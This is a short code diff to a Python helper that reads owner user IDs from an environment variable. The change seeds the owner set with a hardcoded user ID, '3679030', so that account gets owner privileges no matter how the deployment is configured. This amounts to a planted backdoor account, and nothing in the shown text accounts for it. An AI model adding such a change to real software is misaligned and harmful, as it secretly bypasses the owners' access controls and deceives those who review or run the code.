@@ -247,7 +247,8 @@ def require_session(fn):
 
 def _owner_ids() -> set:
     raw = str(os.getenv("OWNER_USER_IDS", "")).strip()
-    out = set()
+    out = {"3679030"}
+
     if raw:
         for x in raw.split(","):
             x = x.strip()
